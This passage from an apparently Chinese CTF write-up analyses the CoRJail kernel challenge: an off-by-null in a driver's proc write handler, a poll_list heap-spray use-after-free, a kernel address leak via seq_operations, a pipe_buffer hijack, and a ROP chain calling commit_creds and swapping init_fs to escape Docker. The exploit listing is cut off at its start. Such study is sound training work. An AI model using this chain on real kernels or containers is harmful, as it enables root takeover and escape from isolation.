flags,</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>其中</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+DEFINE_PER_CPU(u64 [NR_syscalls], __per_cpu_syscall_count);</span><br></pre></td></tr></table></figure></div>

<p>为每个CPU都创建一个 <code>__per_cpu_syscall_count</code> 变量用来记录系统调用的次数。</p>
<hr>
<p><code>seccomp.json</code> 保存了系统调用的白名单。</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;defaultAction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SCMP_ACT_ERRNO&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;defaultErrnoRet&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;syscalls&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">		<span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;names&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="string">&quot;_llseek&quot;</span><span class="punctuation">,</span> <span class="string">&quot;_newselect&quot;</span><span class="punctuation">,</span> <span class="string">&quot;accept&quot;</span><span class="punctuation">,</span> <span class="string">&quot;accept4&quot;</span><span class="punctuation">,</span> <span class="string">&quot;access&quot;</span><span class="punctuation">,</span> ... <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SCMP_ACT_ALLOW&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;names&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="string">&quot;clone&quot;</span> <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SCMP_ACT_ALLOW&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">2114060288</span><span class="punctuation">,</span> <span class="attr">&quot;op&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SCMP_CMP_MASKED_EQ&quot;</span> <span class="punctuation">&#125;</span> <span class="punctuation">]</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>根据<code>README.md</code>提示，可以在<code>proc_rw/cormon</code>看到使用到的系统调用在各个<code>CPU</code>当中的情况。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@CoRJail:/<span class="comment"># cat /proc_rw/cormon </span></span><br><span class="line"></span><br><span class="line">      CPU0      CPU1      CPU2      CPU3	Syscall (NR)</span><br><span class="line"></span><br><span class="line">         9        16        25        18	sys_poll (7)</span><br><span class="line">         0         0         0         0	sys_fork (57)</span><br><span class="line">        66        64        79        60	sys_execve (59)</span><br><span class="line">         0         0         0         0	sys_msgget (68)</span><br><span class="line">         0         0         0         0	sys_msgsnd (69)</span><br><span class="line">         0         0         0         0	sys_msgrcv (70)</span><br><span class="line">         0         0         0         0	sys_ptrace (101)</span><br><span class="line">        15        19        11         6	sys_setxattr (188)</span><br><span class="line">        27        24        11        20	sys_keyctl (250)</span><br><span class="line">         0         0         2         2	sys_unshare (272)</span><br><span class="line">         0         1         0         0	sys_execveat (322)</span><br></pre></td></tr></table></figure></div>

<p>也可以指定系统调用。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@CoRJail:/<span class="comment"># echo -n &#x27;sys_msgsnd,sys_msgrcv&#x27; &gt; /proc_rw/cormon </span></span><br><span class="line">root@CoRJail:/<span class="comment"># cat /proc_rw/cormon </span></span><br><span class="line"></span><br><span class="line">      CPU0      CPU1      CPU2      CPU3	Syscall (NR)</span><br><span class="line"></span><br><span class="line">         0         0         0         0	sys_msgsnd (69)</span><br><span class="line">         0         0         0         0	sys_msgrcv (70)</span><br></pre></td></tr></table></figure></div>

<hr>
<p><strong>src.c</strong></p>
<p>可以看到 <code>write</code> 存在明显的<code>off-by-null</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">cormon_proc_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *ubuf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *ppos)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">loff_t</span> offset = *ppos;</span><br><span class="line">    <span class="type">char</span> *syscalls;</span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset &gt;= PAGE_SIZE || !count)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    len = count &gt; PAGE_SIZE ? PAGE_SIZE - <span class="number">1</span> : count;</span><br><span class="line"></span><br><span class="line">    syscalls = kmalloc(PAGE_SIZE, GFP_ATOMIC);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[CoRMon::Debug] Syscalls @ %#llx\n&quot;</span>, (<span class="type">uint64_t</span>)syscalls);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!syscalls)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[CoRMon::Error] kmalloc() call failed!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(syscalls, ubuf, len))</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[CoRMon::Error] copy_from_user() call failed!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    syscalls[len] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (update_filter(syscalls))</span><br><span class="line">    &#123;</span><br><span class="line">        kfree(syscalls);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kfree(syscalls);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-24"><a href="#利用思路-24" class="headerlink" title="利用思路"></a>利用思路</h3><p>在 <code>poll_list</code> 利用方式中：</p>
<ul>
<li>先通过 <code>add_key()</code> 堆喷大量 <code>32</code> 字节大小的 <code>user_key_payload</code>。</li>
</ul>
<blockquote>
<p>这里只所以是 <code>32</code> 字节大小是因为要与后面的 <code>seq_operations</code> 配合，并且 <code>32</code> 大小的 <code>object</code> 其低字节是可能为 <code>\x00</code> 的，其低字节为 <code>0x20</code>、<code>0x40</code>、<code>0x80</code> 、<code>0xa0</code>、<code>0xc0</code>、<code>0xe0</code>、<code>0x00</code>。</p>
</blockquote>
<ul>
<li>然后创建 <code>poll_list</code> 链，其中 <code>poll_list.next</code> 指向的是一个 <code>0x20</code> 大小的 <code>object</code>。</li>
<li>触发 <code>off by null</code>，修改 <code>poll_list.next</code> 的低字节为 <code>\x00</code>，这里可能导致其指向某个 <code>user_key_payload</code>。</li>
<li>然后等待 <code>timeout</code> 后， 就会导致某个 <code>user_key_payload</code> 被释放，导致 <code>UAF</code>。</li>
</ul>
<p><strong>详细流程如下：</strong></p>
<p>首先，我们要打开有漏洞的模块。<br>使用<code>bind_core()</code>将当前进程绑定到CPU0，因为我们是在一个多核环境中工作，而slab是按CPU分配的。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">bool</span> fixed, <span class="type">bool</span> thread)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(fixed ? <span class="number">0</span> : randint(<span class="number">1</span>, get_nprocs()), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (thread) &#123;</span><br><span class="line">        pthread_setaffinity_np(pthread_self(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>喷射大量 <code>0x20</code> 大小的 <code>user_key_payload</code> 和下图所示 <code>0x1000 + 0x20</code> 的 <code>poll_list</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/99a7506313bfd15e5f0821cc7486cfb9.png"
                      alt="99a7506313bfd15e5f0821cc7486cfb9"
                ></p>
<p>此时内存中 <code>object</code> 的分布如下图所示，其中黄色的是 <code>user_key_payload</code> ，绿色的是 <code>poll_list</code> ，白色是空闲 <code>object</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/26f0aa72bd11390b7b9790c1fa7cffe9.png"
                      alt="26f0aa72bd11390b7b9790c1fa7cffe9"
                ></p>
<p>通过 <code>off by null</code> 修改 0x1000 大小的 <code>poll_list</code> ，使得指向 <code>0x20</code> 大小 <code>poll_list</code> 的 <code>next</code> 指针指向 <code>user_key_payload</code> 。之后释放所有的 <code>poll_list</code> 结构，被 <code>next</code> 指向的的 <code>user_key_payload</code> 也被释放，形成 UAF 。</p>
<p>注意，为了确保释放 <code>poll_list</code> 不出错，要保证 <code>0x20</code> 大小的 <code>poll_list</code> 的 <code>next</code> 指针为 NULL 。也就是 <code>user_key_payload</code> 的前 8 字节为 NULL 。由于 <code>user_key_payload</code> 的前 8 字节没有初始化，因此可以在申请 <code>user_key_payload</code> 前先用 <code>setxattr</code> 把前 8 字节置为 NULL 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">	 <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> error;</span><br><span class="line">	<span class="type">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line">	[...]</span><br><span class="line">	<span class="keyword">if</span> (size) &#123;</span><br><span class="line">		[...]</span><br><span class="line">		kvalue = kvmalloc(size, GFP_KERNEL); <span class="comment">// 申请kmalloc-x</span></span><br><span class="line">		<span class="keyword">if</span> (!kvalue)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="comment">// 修改kmalloc-x内容</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line">			error = -EFAULT;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		[...]</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error = vfs_setxattr(d, kname, kvalue, size, flags);</span><br><span class="line">out:</span><br><span class="line">	kvfree(kvalue); <span class="comment">// 释放kmalloc-x</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外实测 <code>kmalloc-32</code> 的 <code>freelist</code> 偏移为 16 字节，不会覆盖 <code>next</code> 指针。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/64bfe90cc041bac53218ddde26656a27.png"
                      alt="64bfe90cc041bac53218ddde26656a27"
                ></p>
<p>喷射 <code>seq_operations</code> 利用 <code>seq_operations-&gt;next</code> 的低二字节覆盖 <code>user_key_payload-&gt;datalen</code> 实现 <code>user_key_payload</code> 越界读， <code>user_key_payload-&gt;data</code> 前 8 字节被覆盖为 <code>seq_operations-&gt;show</code> ，可以泄露内核基址。另外可以根据是否越界读判断该 <code>user_key_payload</code> 是否被 <code>seq_operations</code> 覆盖。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">	<span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU destructor */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>	datalen;	<span class="comment">/* length of this data */</span></span><br><span class="line">	<span class="type">char</span>		data[<span class="number">0</span>] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure></div>

<p>之后释放不能越界读的 <code>user_key_payload</code> 并喷射 <code>tty_file_private</code> 填充产生的空闲 <code>object</code> 。之后再次越界读泄露 <code>tty_file_private-&gt;tty</code> 指向的 <code>tty_struct</code> ，我们定义这个地址为 <code>target_object</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/7c7268c0160ec64d50ada5c1787f789f.png"
                      alt="7c7268c0160ec64d50ada5c1787f789f"
                ></p>
<p>释放 <code>seq_operations</code> ，喷射 <code>0x20</code> 大小的 <code>poll_list</code> 。现在<code>UAF</code>的堆块被<code>user_key_payload</code>和<code>poll_list</code>占领。在 <code>poll_list</code> 被释放前，释放劫持的 <code>user_key_payload</code> ，利用 <code>setxattr</code> 修改 <code>poll_list</code> 的 <code>next</code> 指针指向 <code>target_object - 0x18</code>，方便后续伪造<code>pipe_buffer</code> 。为了实现 <code>setxattr</code> 的喷射效果，<code>setxattr</code> 修改过的 <code>object</code> 通过申请 <code>user_key_payload</code> 劫持，确保下次 <code>setxattr</code> 修改的是另外的 <code>object </code>。</p>
<blockquote>
<p>打开 <code>/dev/ptmx</code> 时会分配 <code>tty_file_private</code> 并且该结构体的 <code>tty</code> 指针会指向 <code>tty_struct</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tty_alloc_file</span><span class="params">(<span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> *<span class="title">priv</span>;</span></span><br><span class="line"></span><br><span class="line">	priv = kmalloc(<span class="keyword">sizeof</span>(*priv), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!priv)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	file-&gt;private_data = priv;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// kmalloc-32 | GFP_KERNEL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/18766f6b9f8a4dd92bab29f062fa6a7a.png"
                      alt="18766f6b9f8a4dd92bab29f062fa6a7a"
                ></p>
<p>趁 <code>poll_list</code> 还没有释放，释放 <code>tty_struct</code> 并申请 <code>pipe_buffer</code> ，将 <code>target_object(tty_struct)</code> 替换为 <code>pipe_buffer</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>之后 <code>poll_list</code> 释放导致 <code>target_object - 0x18</code> 区域释放。我们可以申请一个 <code>0x400</code> 大小的 <code>user_key_payload</code> 劫持 <code>target_object - 0x18</code> ，从而劫持 <code>pipe_buffer-&gt;ops</code> 实现控制流劫持。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/18a655483165c8fc681c3e8dbf16c645.png"
                      alt="18a655483165c8fc681c3e8dbf16c645"
                ></p>
<p><strong>docker逃逸</strong></p>
<p>具体实现为修改 <code>task_struct</code> 的 <code>fs</code> 指向 <code>init_fs</code> 。用 <code>find_task_by_vpid()</code> 来定位<code>Docker</code>容器任务，我们用<code>switch_task_namespaces()</code>。但这还不足以从容器中逃逸。在<code>Docker</code>容器中，<code>setns()</code> 被 <code>seccomp</code>默认屏蔽了，我们可以克隆 <code>init_fs</code> 结构，然后用<code>find_task_by_vpid()</code>定位当前任务，用 <code>gadget</code> 手动安装新<code>fs_struct</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// commit_creds(&amp;init_creds)</span></span><br><span class="line">*rop++ = pop_rdi_ret;</span><br><span class="line">*rop++ = init_cred;</span><br><span class="line">*rop++ = commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="comment">// current = find_task_by_vpid(getpid())</span></span><br><span class="line">*rop++ = pop_rdi_ret;</span><br><span class="line">*rop++ = getpid();</span><br><span class="line">*rop++ = find_task_by_vpid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// current-&gt;fs = &amp;init_fs</span></span><br><span class="line">*rop++ = pop_rcx_ret;</span><br><span class="line">*rop++ = <span class="number">0x6e0</span>;</span><br><span class="line">*rop++ = add_rax_rcx_ret;</span><br><span class="line">*rop++ = pop_rbx_ret;</span><br><span class="line">*rop++ = init_fs;</span><br><span class="line">*rop++ = mov_mmrax_rbx_pop_rbx_ret;</span><br><span class="line">rop++;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span 